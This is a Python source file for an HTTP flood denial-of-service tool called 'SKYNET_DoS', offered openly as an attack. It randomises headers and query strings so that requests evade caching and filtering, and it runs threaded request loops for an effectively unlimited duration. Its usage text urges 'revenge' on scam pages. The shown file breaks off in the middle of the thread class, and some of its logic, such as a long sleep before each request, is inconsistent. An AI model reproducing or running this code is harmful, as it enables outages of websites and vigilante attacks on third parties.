import requests
import threading
import time
import random

class DDoSAttack:

    # Global params
    url = ""
    host = ""
    port = 80  # Default port
    headers_user_agents = []
    headers_referers = []
    request_counter = 0
    flag = 0
    kill = 0
    attack_duration = 99000000.0 * 24 * 365  # Set the attack duration to 99 million hours (approx. 11,265 years)
    pause_duration = 2  # Set the pause duration in hours
    response_delay = 5  # Set the response delay in seconds
    lock_object = threading.Lock()  # Used for thread synchronization
    message_printed = False  # Variable to track if the message has been printed

    @staticmethod
    def inc_counter():
        with DDoSAttack.lock_object:
            DDoSAttack.request_counter += 1

    @staticmethod
    def set_flag(val):
        with DDoSAttack.lock_object:
            DDoSAttack.flag = val

    @staticmethod
    def set_kill():
        with DDoSAttack.lock_object:
            DDoSAttack.kill = 1

    # Generates a user agent list
    @staticmethod
    def user_agent_list():
        DDoSAttack.headers_user_agents.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
        # ... (remaining user agents)

    # Generates a referer list
    @staticmethod
    def referer_list():
        DDoSAttack.headers_referers.append("http://www.google.com/?q=")
        # ... (remaining referers)

    # Builds random ASCII string
    @staticmethod
    def build_block(size):
        random_str = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(size))
        return random_str

    @staticmethod
    def usage():
        print("WARNING SKYNET IS POWERFUL PROGRAM DENIAL OF SERVICE IT CAN HARM YOUR WEBSITE")
        print("SKYNET_DoS.py <url> [port] [attack_duration]")
        print("you can add 'kill' after url, to autoshut after dos")
        print("MAKE YOUR OWN RISK DESTROY EVERYTHING")
        print("USE FOR GOOD THING&& DONT USE FOR BAD THINGS&& DESTROY REVENGE FOR SCAM PAGE")

    # HTTP request
    @staticmethod
    def http_call(url):
        DDoSAttack.user_agent_list()
        DDoSAttack.referer_list()
        code = 0
        param_joiner = '&' if '?' in url else '?'
        random_param = f"{DDoSAttack.build_block(random.randint(8, 10))}={DDoSAttack.build_block(random.randint(8, 10))}"

        try:
            target_url = f"{url}{param_joiner}{random_param}"
            headers = {
                "User-Agent": random.choice(DDoSAttack.headers_user_agents),
                "Cache-Control": "no-cache",
                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                "Referer": f"{random.choice(DDoSAttack.headers_referers)}{DDoSAttack.build_block(random.randint(5, 10))}",
                "Keep-Alive": str(random.randint(110, 120)),
                "Connection": "keep-alive",
                "Host": DDoSAttack.host
            }

            desired_sleep_seconds = DDoSAttack.response_delay
            start_time = time.time()

            while (time.time() - start_time) < desired_sleep_seconds:
                # Sleep for a shorter duration as needed
                time.sleep(9.999)

            response = requests.get(target_url, headers=headers)

            response_code = response.status_code
            DDoSAttack.inc_counter()

            if response_code == 403:
                DDoSAttack.set_flag(1)
                print("High Power Attack has been broadcast to all devices...")
                code = 403

        except (requests.RequestException, IOError, Exception) as ex:
            print(str(ex))

        # Print the message after the attack only once
        if not DDoSAttack.message_printed:
            print("\nThis Website Is Protected...")
            DDoSAttack.message_printed = True  # Set the variable to True to indicate that the message has been printed

        return code

    # HTTP caller thread - High Power
    class HTTPThread(threading.Thread):
        def run(self):
            try:
                start_time = time.time()  # Record the start time
                # Extend the attack duration using a factor
                duration_factor = 999
